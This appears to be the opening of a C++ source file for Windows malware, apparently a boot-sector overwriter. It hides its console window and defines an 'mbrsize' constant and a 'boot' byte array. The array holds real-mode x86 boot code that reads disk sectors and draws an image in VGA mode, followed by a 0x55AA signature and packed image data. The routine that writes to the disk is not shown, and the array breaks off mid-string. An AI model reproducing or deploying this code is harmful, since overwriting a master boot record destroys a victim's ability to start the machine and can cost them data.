#include <iostream>
#include <memory>
#include <stdio.h>
#include <tchar.h>
#include <time.h>
#include <Windows.h>
#include <windef.h>
#include <fstream>
#include <iosfwd>
#include "icondll.h"
#include <cmath>
#pragma comment(lib, "Winmm.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
using namespace std;
HCRYPTPROV prov;
#define mbrsize 6144
#define boot "\xBB\xE0\x07\x8E\xC3\x8E\xDB\xB8\x16\x02\xB9\x02\x00\xB6\x00\xBB\x00\x00\xCD\x13\x31\xC0\x89\xC3\x89\xC1\x89\xC2\xBE\x00\x00\xBF\x44\x14\xAC\x81\xFE\x44\x14\x73\x31\x3C\x80\x73\x02\xEB\x0F\x24\x7F\x88\xC1\xAC\xAA\xFE\xC9\x80\xF9\xFF\x75\xF7\xEB\xE4\xB4\x00\x3C\x40\x72\x05\x24\x3F\x88\xC4\xAC\x89\xC1\xAD\x89\xF2\x89\xFE\x29\xC6\xAC\xAA\xE2\xFC\x89\xD6\xEB\xC8\xB8\x13\x00\xCD\x10\xBB\xE0\x07\x8E\xDB\xBE\x44\x14\xB4\x00\xAC\xBB\x00\x00\x89\xC1\xBA\xC8\x03\x88\xD8\xEE\x43\xBA\xC9\x03\xAC\xEE\xAC\xEE\xAC\xEE\xE2\xEE\xBB\x00\xA0\x8E\xC3\xBF\x00\x00\xB9\x00\x7D\xF3\xA5\xF4\xEB\xFD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\xAA\xD6\xFF\x3F\x3F\x3F\x18\x31\x3F\x2E\x01\x03\x01\x01\x03\x01\x01\x01\x00\x00\x00\x06\x06\x06\x02\x02\x07\x14\x14\x14\x16\x16\x16\x03\x03\x03\x13\x15\x15\x18\x02\x03\x05\x03\x03\x15\x03\x03\x13\x03\x03\x0C\x1F\x22\x0D\x21\x26\x19\x32\x3F\x30\x01\x03\x03\x03\x0A\x0B\x1E\x21\x01\x01\x01\x04\x04\x04\x03\x03\x0A\x14\x14\x14\x04\x03\x03\x02\x02\x07\x02\x02\x04\x42\x00\x06\x54\x00\xCF\x16\x31\x3F\x20\x2F\x27\x03\x03\x0B\x02\x00\x01\x02\x00\x01\x05\x03\x04\x03\x03\x0E\x3F\x07\x09\x01\x01\x03\x2F\x04\x01\x03\x03\x0B\x30\x2D\x00\x03\x03\x0B\x17\x31\x3F\x03\x03\x0D\x1B\x32\x3F\x27\x36\x3F\x02\x02\x07\x30\x09\x00\x03\x03\x0A\x02\x02\x08\x03\x03\x0B\x01\x01\x04\x03\x03\x0D\x03\x03\x0F\x32\x02\x04\x3F\x08\x04\x39\x00\x9C\x01\x01\x03\x22\x22\x22\x2D\x01\x02\x03\x03\x0E\x02\x02\x07\x20\x20\x20\x03\x03\x03\x01\x01\x04\x02\x02\x07\x01\x01\x04\x97\x00\xA6\x02\x02\x08\x04\x04\x06\x03\x03\x0D\x01\x01\x01\x16\x30\x3F\x2C\x2C\x00\x02\x02\x06\x01\x01\x02\x0C\x0C\x0C\x09\x09\x09\x13\x13\x13\x0C\x0C\x0C\x14\x14\x14\x04\xB9\x00\x83\x03\x03\x22\x35\x04\x02\x01\x87\x2F\x01\x03\x2F\x08\x00\x00\x00\x04\x48\x00\x81\x04\x04\x04\x4B\x00\xA1\x02\x02\x06\x0E\x0E\x0E\x06\x06\x06\x20\x20\x20\x1F\x1F\x1F\x09\x09\x09\x1F\x1F\x1F\x1D\x1D\x1D\x05\x03\x03\x12\x16\x17\x0B\x20\x23\x16\x06\x14\x01\xA4\x16\x16\x12\x18\x19\x01\x01\x05\x1A\x34\x3F\x06\x03\x03\x1C\x33\x3F\x1B\x32\x3F\x3B\x05\x07\x2C\x01\x02\x3F\x07\x08\x03\x03\x0A\x23\x35\x3F\x1F\x33\x04\x12\x00\x83\x2D\x01\x02\x3A\x05\x18\x00\x84\x03\x03\x0D\x02\x02\x04\x57\x00\x94\x15\x15\x15\x21\x21\x21\x1F\x1F\x1F\x14\x14\x14\x0A\x1F\x22\x06\x03\x03\x1B\x02\x03\x05\x8F\x01\x8C\x02\x26\x36\x3F\x28\x37\x3F\x01\x01\x03\x17\x30\x3F\x05\xDB\x00\x89\x08\x01\x01\x02\x22\x22\x22\x09\x09\x09\x06\xE4\x00\x87\x15\x14\x13\x0A\x1E\x21\x19\x32\x04\xBD\x00\x90\x00\x00\x03\x2D\x2D\x00\x30\x08\x00\x32\x08\x00\x2F\x2F\x00\x35\x09\x04\x09\x00\x8B\x02\x02\x08\x08\x08\x08\x04\x04\x04\x06\x06\x06\x05\x20\x01\x8E\x02\x2E\x01\x02\x30\x30\x00\x01\x01\x05\x01\x01\x04\x33\x33\x04\x14\x01\xB8\x11\x11\x11\x0F\x0F\x0F\x0D\x0D\x0D\x0D\x0D\x0D\x07\x07\x07\x0E\x0E\x0E\x0C\x0C\x0C\x0A\x0A\x0A\x0B\x0B\x0B\x06\x06\x06\x13\x15\x16\x0A\x09\x09\x0A\x0A\x0A\x04\x02\x03\x04\x02\x03\x07\x05\x05\x15\x13\x13\x13\x16\x16\x09\x09\x09\x06\x19\x02\x8A\x0D\x22\x27\x0B\x0B\x0B\x08\x08\x08\x1A\x02\x04\x38\x01\xAE\x14\x14\x14\x0B\x20\x23\x0E\x23\x29\x16\x03\x03\x32\x01\x03\x0E\x23\x28\x0D\x21\x26\x11\x25\x2C\x1A\x32\x3F\x07\x03\x03\x0A\x03\x03\x34\x03\x04\x32\x03\x04\x31\x02\x03\x0D\x22\x27\x28\x37\x04\xE1\x00\xAC\x1A\x02\x03\x26\x36\x3F\x24\x36\x3F\x22\x34\x3F\x3F\x07\x09\x3E\x06\x08\x3B\x06\x07\x37\x04\x06\x02\x02\x09\x21\x34\x3F\x15\x30\x3F\x16\x30\x3F\x17\x30\x3F\x2A\x00\x01\x2C\x01\x02\x05\xF2\x01\x82\x08\x28\x37\x04\x15\x00\x81\x3C\x06\x04\x4A\x01\x96\x1A\x32\x3F\x22\x35\x3F\x17\x31\x3F\x37\x04\x06\x2D\x01\x02\x02\x02\x09\x17\x31\x3F\x15\x31\x04\x12\x00\x87\x1B\x30\x36\x21\x2F\x27\x00\x00\x06\x25\x02\x99\x05\x01\x01\x02\x23\x23\x23\x07\x07\x07\x21\x21\x21\x06\x06\x06\x04\x04\x04\x07\x03\x03\x00\x00\x00\x00\x04\x04\x00\x08\x08\x00\x10\x10\x00\x20\x20\x00\x40\x40\x40\x00\x40\x80\x80\x00\x41\x00\x00\x01\x42\x00\x00\x02\x44\x00\x00\x04\x48\x00\x00\x08\x50\x00\x00\x10\x60\x00\x00\x20\x44\xD5\xD5\x04\x90\xF9\xF9\x3D\x3D\x3D\x3D\x3D\x3D\x8F\x7E\x7E\x7F\x7F\x09\x09\x09\x09\x04\x04\x00\x08\x08\x00\x10\x10\x00\x1F\x1F\x00\x85\x7F\x7F\x7E\x7E\x8F\x8F\x06\x50\x00\x80\xF9\x06\x5F\x00\x91\xAA\xAA\xAB\xAB\x5F\x5F\xAC\xAC\xAD\xAD\x4F\x4F\x60\x60\x06\x06\x06\x06\x04\x04\x00\x08\x08\x00\x10\x10\x00\x1E\x1E\x00\x8D\x60\x60\x4F\x4F\xAD\xAD\xAC\xAC\x5F\x5F\xAB\xAB\xAA\xAA\x05\x5F\x00\x89\x90\x90\xFA\xFA\xAE\xAE\x17\x17\x17\x17\x04\x04\x00\x08\x08\x00\x10\x10\x00\x20\x20\x00\x93\x17\x5C\x5C\x06\x06\xFA\xFA\xFA\xFA\x9F\x50\x50\x50\x50\xC1\xC1\xC1\xC1\xB1\xB1\x41\x40\x40\x01\x28\x40\x01\x90\xFB\xFB\x41\x41\x41\x41\x61\x61\x80\x62\x62\x51\x51\x19\x19\x19\x19\x04\x87\x48\x04\x04\x00\x08\x08\x00\x10\x10\x00\x17\x17\x00\x04\x3B\x00\x87\x51\x51\x62\x62\x80\x80\x61\x61\x04\x52\x00\x80\xFB\x06\x5F\x00\x96\xAF\xAF\xB0\xB0\x52\x52\xB1\xB1\xB2\xB2\x63\x63\x42\x42\x1A\x1A\x1A\x46\x46\x0A\x0A\x0A\x0A\x04\x04\x00\x08\x08\x00\x10\x10\x00\x14\x14\x00\x92\x46\x46\x1A\x1A\x1A\x42\x42\x63\x63\xB2\xB2\xB1\xB1\x52\x52\xB0\xB0\xAF\xAF\x05\x5F\x00\x85\xFC\xFC\xA0\xA0\x17\x17\x04\x03\x4A\x04\x04\x00\x08\x08\x00\x0D\x0D\x00\x83\x91\x91\x91\x91\x1D\x21\x00\x95\x04\x04\x04\x4A\x4A\x92\x92\xFD\xFD\xA0\xA0\xA1\xB3\xB3\xB3\xB3\xB9\xB9\xB9\xB9\xC1\xC1\x41\x40\x40\x01\x28\x40\x01\x81\x3D\x3D\x04\xEE\x00\x84\x64\x64\x81\x65\x65\x04\x40\x01\x87\x53\x53\xB4\xB4\x0B\x0B\x0B\x0B\x04\x04\x00\x08\x08\x00\x10\x10\x00\x13\x13\x00\x83\xB4\xB4\x53\x53\x04\x40\x01\x85\x65\x65\x81\x81\x64\x64\x04\x52\x00\x80\x3D\x06\x5F\x00\x92\x5F\x5F\x52\x52\x4F\x4F\xB5\xB5\xB6\xB6\x50\x50\x42\x42\x1A\x55\x55\x66\x66\x06\x40\x4B\x06\x06\x00\x0C\x0C\x00\x18\x18\x00\x04\x04\x00\x82\x66\x66\x55\x04\x40\x01\x8B\x50\x50\xB6\xB6\xB5\xB5\x4F\x4F\x52\x52\x5F\x5F\x05\x5F\x00\x04\xBC\x03\x81\x5C\x5C\x06\x05\x01\x83\x16\x16\x16\x16\x04\x04\x00\x08\x08\x00\x07\x07\x00\x84\x45\x45\x45\x45\x45\x17\x1C\x00\x04\x04\x00\x06\x40\x01\x81\x46\x46\x04\x89\x01\x84\xA1\xA1\xA1\xA1\xA1\x41\x40\x40\x01\x30\x40\x01\x83\x61\x61\x64\x64\x04\x7E\x03\x8C\x19\x19\x19\x93\x93\x67\x67\x68\x68\x10\x10\x10\x10\x04\x04\x00\x08\x08\x00\x10\x10\x00\x13\x13\x00\x85\x68\x68\x67\x67\x93\x93\x07\x46\x00\x84\x19\x64\x64\x61\x61\x07\x40\x01\x89\x4F\x4F\x63\x63\x50\x50\x1A\x1A\x1A\x1A\x04\x04\x00\x88\xA2\xFE\xFE\x69\x69\x0E\x0E\x0E\x0E\x04\x04\x00\x08\x08\x00\x10\x10\x00\x14\x14\x00\x84\x69\x69\xFE\xA2\xA2\x08\x46\x00\x85\x50\x50\x63\x63\x4F\x4F\x05\x5F\x00\x0A\xBC\x03\x05\xFE\x4F\x80\x03\x04\x04\x00\x08\x08\x00\x8D\x03\x28\x28\x97\x97\xA7\xA7\x1B\x1B\x1B\x1B\x6D\x5A\x5A\x11\x1E\x00\x08\x24\x00\x81\x45\x45\x08\xE0\x03\x8C\x4A\x4A\x46\x5C\x5C\x5C\x5C\xB7\xB7\xB8\xB8\xB9\xB9\x41\x40\x40\x01\x28\x40\x01\x85\x8F\x8F\x80\x80\x81\x81\x05\xF7\x00\x8B\x82\x82\xBA\xBA\xBB\xBB\x83\x83\x15\x15\x15\x15\x04\x04\x00\x08\x08\x00\x10\x10\x00\x13\x13\x00\x87\x83\x83\xBB\xBB\xBA\xBA\x82\x82\x06\x40\x01\x84\x81\x81\x80\x80\x8F\x06\x5F\x00\x85\x52\x52\x90\x90\xBC\xBC\x06\xF8\x00\x8A\xBD\xBD\xA2\x84\x84\x6A\x6A\x0F\x0F\x0F\x0F\x04\x04\x00\x08\x08\x00\x10\x10\x00\x14\x14\x00\x86\x6A\x6A\x84\xA2\xA2\xBD\xBD\x06\x48\x00\x85\xBC\xBC\x90\x90\x52\x52\x17\x40\x01\x80\x1F\x15\x40\x01\x81\xF5\xF5\x0C\x35\x01\x80\x1F\x0A\x25\x00\x41\x40\x40\x01\x40\x41\x40\x01\x86\x7E\x7E\x62\x62\x65\x65\x19\x04\x3A\x06\x8B\x6B\x6B\xBE\xBE\x6C\x6C\xBF\xBF\x11\x11\x11\x11\x04\x04\x00\x08\x08\x00\x10\x10\x00\x13\x13\x00\x87\xBF\xBF\x6C\x6C\xBE\xBE\x6B\x6B\x04\x46\x06\x86\x19\x19\x65\x65\x62\x62\x7E\x06\x5F\x00\x85\xC0\xC0\x9F\x9F\xC1\xC1\x04\xF6\x00\x8C\x55\x55\x84\x84\x0D\xCE\xCE\xC2\xC2\x0C\x0C\x0C\x0C\x04\x04\x00\x08\x08\x00\x10\x10\x00\x14\x14\x00\x88\xC2\xC2\xCE\x0D\x0D\x84\x84\x55\x55\x04\x4A\x00\x85\xC1\xC1\x9F\x9F\xC0\xC0\x0B\x40\x01\x06\x27\x06\x06\x11\x01\x83\x36\x36\x36\x36\x04\x04\x00\x88\x36\x36\x36\x43\x43\xC3\xC3\x6D\x6D\x04\x40\x01\x80\xF7\x0D\x18\x00\x84\x36\x36\x36\x28\x28\x09\x40\x01\x81\xA3\xA3\x04\x41\x00\x06\x40\x01\x86\xBD\x46\x46\x46\x46\xB8\xB8\x41\x40\x40\x01\x2C\x40\x01\x96\x7F\x7F\x51\x51\xC4\xC4\x19\x19\x82\x6B\x6B\xC5\xC5\x94\x94\xC6\xC6\x6E\x6E\x12\x12\x12\x12\x04\x04\x00\x08\x08\x00\x10\x10\x00\x13\x13\x00\x89\x6E\x6E\xC6\xC6\x94\x94\xC5\xC5\x6B\x6B\x04\xC4\x03\x84\xC4\xC4\x51\x51\x7F\x06\x5F\x00\x83\x60\x60\x42\x42\x04\x38\x0B\x8E\x46\x46\x6F\x6F\xC7\xC7\x0F\x85\x85\xC8\xC8\x13\x13\x13\x13\x04\x04\x00\x08\x08\x00\x10\x10\x00\x14\x14\x00\x88\xC8\xC8\x85\x0F\x0F\xC7\xC7\x6F\x6F\x04\x49\x0B\x04\x52\x00\x81\x60\x60\x09\x40\x01\x0A\x3A\x06\x88\x1F\x1F\x43\x43\x1B\x1D\x1D\x1D\x1D\x04\x04\x00\x06\x06\x00\x86\x07\x07\x07\x07\x07\x07\x07\x0E\x15\x00\x83\x5D\x5D\xA7\xA7\x0B\x51\x06\x85\x28\x28\xC3\xC3\x45\x45\x07\xC3\x03\x87\x4A\x4A\x23\x23\x24\x24\x25\x25\x41\x40\x40\x01\x28\x40\x01\x81\x09\x09\x06\xB9\x08\x8E\xBA\x0B\x0B\x94\x94\x15\x15\xCA\xCA\x95\x95\x2D\x2D\x2D\x2D\x04\x04\x00\x85\x96\x96\x01\x01\x01\x01\x04\x04\x00\x08\x08\x00\x10\x10\x00\x81\x96\x96\x07\x2B\x00\x8B\x95\x95\xCA\xCA\x15\x15\x94\x94\x0B\x0B\xBA\xBA\x06\xC8\x08\x80\x09\x06\x5F\x00\x81\x06\x06\x05\xB8\x08\x8F\xA2\xA2\xA2\x0D\x0D\x0F\x0F\x0F\x0C\x0C\x13\x13\x3E\x3E\x3E\x3E\x04\x04\x00\x85\xA4\xA4\x02\x02\x02\x02\x04\x04\x00\x08\x08\x00\x10\x10\x00\x81\xA4\xA4\x08\x2C\x00\x82\x13\x13\x0C\x04\x47\x06\x81\x0D\x0D\x04\x4A\x00\x04\x52\x00\x81\x06\x06\x11\x40\x01\x86\x1F\x1F\x3B\x3B\x36\x36\x40\x07\x32\x01\x86\x07\x07\x07\x1C\x1C\x1C\x1C\x04\x04\x00\x07\x07\x00\x0A\x19\x00\x84\x1B\x1B\xA7\xA7\xF5\x0B\x45\x06\x05\x46\x06\x09\xCD\x0D\x32\x40\x01\x99\x53\x53\x67\x67\x6B\x6C\x6C\xC9\xC9\xCA\xCA\xCB\xCB\x70\x70\x2F\x2F\x2F\x2F\x2F\x2F\x71\x71\xCC\xCC\x86\x1D\x3E\x01\x85\x86\x86\xCC\xCC\x71\x71\x05\x2D\x00\x8D\x70\x70\xCB\xCB\xCA\xCA\xC9\xC9\x6C\x6C\x6B\x6B\x67\x67\x04\x06\x05\x0B\x40\x01\x9A\x55\x55\xCD\xCD\x6F\x6F\xCE\xCE\x85\x85\x0C\x85\x85\xCF\xCF\x39\x39\x39\x39\x39\x39\xD0\xD0\xD1\xD1\x87\x87\x1C\x3E\x01\x85\x87\x87\xD1\xD1\xD0\xD0\x06\x2E\x00\x8C\xCF\xCF\x85\x0C\x0C\x85\x85\xCE\xCE\x6F\x6F\xCD\xCD\x04\x06\x05\x09\x40\x01\x0A\xFA\x04\x85\x43\x43\x36\x36\xA7\xA7\x09\x40\x01\x89\x1D\x1D\x44\x44\x31\x31\x44\x44\x44\x44\x04\x04\x00\x80\x44\x04\x0D\x00\x0A\x40\x01\x84\x6D\x6D\x28\x43\x43\x09\x05\x05\x05\x06\x05\x04\xA7\x0C\x41\x40\x40\x01\x35\x40\x01\x9B\x08\x08\x0B\x0B\x68\x68\x83\xD2\xD2\x6E\x6E\x95\x95\x70\x70\xD3\xD3\x30\x30\x30\x30\x30\x30\xD4\xD4\x56\x56\x4B\x1D\x40\x01\x85\x4B\x4B\x56\x56\xD4\xD4\x05\x2D\x00\x8D\xD3\xD3\x70\x70\x95\x95\x6E\x6E\xD2\xD2\x83\x83\x68\x68\x04\x25\x5B\x09\x40\x01\x9C\x0A\x0A\x66\x66\x69\x69\x6A\x6A\xD5\xD5\xC8\xC8\x13\xCF\xCF\x3A\x3A\x27\x27\x27\x27\x27\x27\x3A\x3A\x72\x72\x73\x73\x1C\x40\x01\x83\x73\x73\x72\x72\x0A\x2E\x00\x80\xCF\x04\x05\x05\x89\xD5\xD5\x6A\x6A\x69\x69\x66\x66\x0A\x0A\x07\x40\x01\x85\x48\x48\x8E\x8E\x8E\x8E\x04\xBA\x03\x85\x3C\x3C\x1B\x1B\x40\x40\x09\xF1\x04\x96\x1C\x1C\x34\x34\x14\x14\x33\x33\x18\x18\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x35\x35\xDD\xDD\x4D\x4D\x0A\x5D\x01\x86\x40\xE5\xE5\x54\x54\x97\x97\x0A\x42\x01\x83\x28\x28\x28\x28\x05\x87\x07\x41\x40\x40\x01\x34\x40\x01\x94\x10\x10\x15\x11\x11\x12\x12\x2D\x2D\x2F\x2F\x30\x30\xD6\xD6\xD6\xD6\x88\x88\x89\x89\x24\x40\x01\x94\x89\x89\x88\x88\xD6\xD6\xD6\x30\x30\x2F\x2F\x2D\x2D\x12\x12\x11\x11\x15\x15\x10\x10\x0F\x40\x01\x83\x0D\x0D\x0E\x0E\x07\x3B\x06\x87\x39\x39\x27\x27\x74\x74\x74\x74\x2C\x40\x01\x06\x30\x00\x80\x39\x05\x45\x06\x86\x0C\x0F\x0F\x0E\x0E\x0D\x0D\x0F\x40\x01\x85\x3B\x3B\x4E\x4E\x8A\x8A\x06\x3C\x01\x07\x2D\x06\x96\x4D\x4D\x5D\x5D\x18\x18\x75\x75\x33\x33\x14\x14\x14\x14\x14\x14\x14\x22\x22\x47\x47\x5E\x5E\x0B\x4C\x06\x85\x1B\x1B\x5B\x5B\x5A\x5A\x0A\x42\x01\x04\x04\x00\x41\x40\x40\x01\x40\x48\x40\x01\x88\xD7\xD7\xD8\xD8\x76\x76\x77\x77\x8B\x1D\x40\x01\x89\x8B\x8B\x77\x77\x76\x76\xD8\xD8\xD7\xD7\x2D\x40\x01\x8B\xD9\xD9\xDA\xDA\x78\x78\xDB\xDB\xDC\xDC\x79\x79\x1C\x40\x01\x8B\x79\x79\xDC\xDC\xDB\xDB\x78\x78\xDA\xDA\xD9\xD9\x1A\x40\x01\x89\x4E\x4E\x4E\x4E\x5B\x5B\x8C\x8C\x54\x54\x04\x40\x01\x8E\x1D\x1D\x34\x34\x34\x34\x34\x34\x34\x5D\x5D\x47\x47\x18\x18\x04\xC0\x03\x07\x40\x01\x85\x2A\x2A\xDD\xDD\x1B\x1B\x07\x1E\x00\x8F\x34\x31\x31\x1C\x40\x40\x6D\x6D\x43\x43\x54\x54\x3C\x3C\x1F\x1F\x08\xCC\x08\x41\x40\x40\x01\x40\x46\x40\x01\x8A\x88\x88\xDE\xDE\xDF\xDF\xE0\xE0\xE1\xE1\x57\x1D\x40\x01\x8A\x57\x57\xE1\xE1\xE0\xE0\xDF\xDF\xDE\xDE\x88\x2C\x40\x01\x8B\x27\x27\x78\x78\xE2\xE2\xE3\xE3\xE4\xE4\x58\x58\x1C\x40\x01\x89\x58\x58\xE4\xE4\xE3\xE3\xE2\xE2\x78\x78\x04\x34\x00\x18\x40\x01\x83\x3B\x3B\x8A\x8A\x04\xE3\x0E\x81\x1B\x1B\x04\xBC\x03\x86\x44\x44\x2C\x22\x22\x22\x22\x04\x04\x00\x81\x2A\x2A\x07\x3A\x01\x07\x07\x00\x82\x14\x2A\x2A\x08\x1B\x00\x84\x35\x35\x47\x47\x4D\x04\x6D\x01\x89\x1B\x1B\xE5\xE5\x8C\x8C\x4E\x4E\x3B\x3B\x41\x40\x40\x01\x40\x48\x40\x01\x89\x71\x71\xE6\xE6\x89\x89\x76\x76\xE7\xE7\x20\xBC\x0D\x08\x08\x00\x88\xE7\xE7\x76\x76\x89\xE6\xE6\x71\x71\x26\x40\x01\x87\x3A\x3A\x3A\x3A\xE8\xE8\xE9\xE9\x20\xBC\x0D\x08\x08\x00\x83\xE9\xE9\xE8\xE8\x04\x34\x00\x1C\x40\x01\x0A\xB1\x0D\x81\x44\x44\x0B\x36\x01\x83\x18\x18\x18\x18\x04\x04\x00\x07\x07\x00\x0A\x19\x00\x83\x22\x22\x9E\x9E\x07\xCB\x08\x81\x1B\x1B\x41\x40\x40\x01\x40\x4C\x40\x01\x8B\x96\x96\xEA\xEA\xEB\xEB\x56\x56\x77\x77\xEC\xEC\x28\x40\x01\x8A\xEC\xEC\x77\x77\x56\xEB\xEB\xEA\xEA\x96\x96\x21\x40\x01\x8A\xA4\xD1\xD1\x7A\x7A\x7A\x7A\xED\xED\xEE\xEE\x28\x40\x01\x83\xEE\xEE\xED\xED\x04\x34\x00\x82\xD1\xA4\xA4\x15\x40\x01\x81\x1F\x1F\x17\x40\x01\x85\x2A\x2A\x2C\x2C\x2C\x2C\x04\x04\x00\x07\x07\x00\x81\x22\x22\x0A\x40\x01\x82\x47\x47\x07\x06\xCF\x0D\x04\xC6\x08\x81\x3B\x3B\x40\x48\x40\x06\x41\x40\x40\x01\x04\x14\x10\x86\x4B\x4B\x4B\x4B\x8B\x8B\x57\x1E\x3B\x06\x0D\x46\x06\x88\x8B\x8B\x4B\x4B\x4B\x86\x86\x01\x01\x21\x40\x01\x88\x58\x87\x87\x7B\x7B\x7B\x7B\x79\x79\x1E\x3A\x06\x0E\x46\x06\x81\x79\x79\x04\x34\x00\x82\x87\x58\x58\x15\x40\x01\x83\x03\x03\x3C\x3C\x13\x40\x01\x89\x18\x18\x2C\x2C\x49\x49\x37\x37\x37\x37\x04\x04\x00\x86\x37\x37\x37\x49\x49\x35\x35\x08\xC4\x03\x86\x22\x22\xEF\xEF\x44\x9E\x9E\x04\xF1\x08\x83\x1B\x1B\x54\x54\x0A\xCA\x12\x41\x40\x40\x01\x40\x42\x40\x01\x11\x1D\x01\x87\xF0\xF0\xF1\xF1\x20\x20\x20\x20\x04\x04\x00\x08\x08\x00\x84\x20\xF1\xF1\xF0\xF0\x13\x62\x01\x21\x40\x01\x14\x21\x01\x83\x1E\x1E\x1E\x1E\x04\x04\x00\x08\x08\x00\x05\x05\x00\x15\x4B\x01\x1F\x40\x01\x04\xB5\x0D\x81\x31\x31\x05\x40\x01\x04\x3A\x0B\x87\x22\x22\x7C\x7C\x2E\x2E\x2E\x2E\x04\x04\x00\x86\x2E\x2E\x2E\x7C\x7C\x35\x35\x08\x4F\x0B\x04\xC0\x03\x82\x31\x44\x44\x41\x40\x40\x01\x40\x63\x40\x01\x89\xF2\xF2\xF3\xF3\xF4\xF4\x21\x21\x21\x21\x04\x04\x00\x08\x08\x00\x86\x21\xF4\xF4\xF3\xF3\xF2\xF2\x40\x43\x40\x01\x86\x1E\x1E\x58\x29\x29\x29\x29\x04\x04\x00\x08\x08\x00\x05\x05\x00\x15\xE0\x03\x1D\x40\x01\x88\x1D\x1D\x8D\x8D\x34\x34\x47\x47\x2A\x04\x3A\x06\x8B\x35\x35\x2C\x2C\x35\x35\x3F\x3F\x49\x49\x49\x49\x04\x04\x00\x86\x49\x49\x49\x3F\x3F\x2E\x2E\x04\x15\x00\x04\x46\x06\x04\xCC\x0D\x82\x9E\xEF\xEF\x04\x42\x06\x41\x40\x40\x01\x40\x5F\x40\x01\x87\x20\x20\xF4\xF4\x2B\x2B\x2B\x2B\x04\x04\x00\x08\x08\x00\x05\x05\x00\x83\xF4\xF4\x20\x20\x40\x45\x40\x01\x84\x29\x32\x32\x32\x32\x04\x04\x00\x08\x08\x00\x05\x05\x00\x81\x29\x29\x13\xC4\x03\x15\x40\x01\x83\x28\x28\x36\x36\x04\x40\x01\x81\x31\x31\x06\x31\x0B\x05\x3A\x06\x89\x3F\x3F\x7C\x7C\x3F\x3F\x38\x38\x38\x38\x04\x04\x00\x07\x07\x00\x81\xF6\xF6\x04\x15\x00\x06\x46\x06\x88\x18\x18\x33\x14\x14\x34\x34\x1C\x1C\x40\x61\x40\x01\x89\x21\x21\x2B\x2B\x98\x98\x4C\x4C\x4C\x4C\x04\x04\x00\x8A\x4C\x4C\x4C\x98\x98\x98\x98\x2B\x2B\x21\x21\x40\x4A\x40\x01\x85\x99\x99\x59\x59\x59\x59\x04\x04\x00\x04\x04\x00\x83\x99\x99\x99\x99\x2B\x40\x01\x04\xC1\x13\x06\x40\x01\x81\x33\x33\x05\xEF\x13\x04\x40\x01\x8B\x37\x37\x2E\x2E\x49\x49\x38\x38\x26\x26\x26\x26\x04\x04\x00\x84\x26\x26\x26\x38\x38\x04\x82\x02\x81\x37\x37\x06\x40\x01\x84\x33\x33\x75\x18\x18\x06\x40\x01\x83\x43\x43\xF5\xF5\x04\x5F\x24\x04\x0E\x19\x41\x40\x40\x01\x40\x57\x40\x01\x8C\x4C\x4C\x9B\x9B\xA8\xA8\xA8\xA8\xA5\xA5\x9B\x9B\xA5\x40\x52\x40\x01\x8B\x59\x59\x9D\x9D\x9C\x9C\x9C\x9C\x9A\x9A\x9D\x9D\x04\x04\x00\x2D\x40\x01\x83\x6D\x6D\x6D\x6D\x06\x40\x01\x07\xEF\x13\x25\x40\x01\x09\xC0\x03\x89\x40\x40\xF7\xF7\xA6\xA6\x6D\x6D\x03\x03\x04\x86\x0C\x41\x40\x40\x01\x40\x59\x40\x01\x04\x3E\x01\x04\x04\x00\x05\x45\x01\x81\x4C\x4C\x40\x50\x40\x01\x81\x9C\x9C\x04\x63\x11\x04\x44\x01\x04\x46\x01\x81\x59\x59\x29\x40\x01\x81\x33\x33\x08\xFA\x13\x81\x31\x31\x07\xF1\x13\x25\x40\x01\x05\x05\x0A\x81\x8D\x8D\x04\x09\x19\x81\x40\x40\x04\x06\x14\x85\x8A\x8A\xF8\xF8\x4E\x4E\x41\x40\x40\x01\x40\x61\x40\x01\x84\xA5\xA5\xA8\x9B\x9B\x40\x5A\x40\x01\x85\x9A\x9A\x9C\x9C\x9D\x9D\x41\x40\x40\x01\x40\xD3\x40\x01\x81\xA5\xA5\x09\xC0\x03\x40\x54\x40\x01\x04\x38\x01\x06\xBE\x03\x2F\x40\x01\x04\x40\x06\x81\xF7\xF7\x3B\x40\x01\x04\x40\x06\x04\x43\x00\x81\x8A\x8A\x40\x5D\x40\x06\x41\x40\x40\x01\x04\xC0\x08\x07\x44\x01\x40\x54\x40\x01\x04\xC0\x08\x08\x44\x01\x2F\x40\x01\x83\x5A\x5A\x1F\x1F\x3B\x40\x01\x40\x6B\x40\x0B\x41\x3C\x40\x0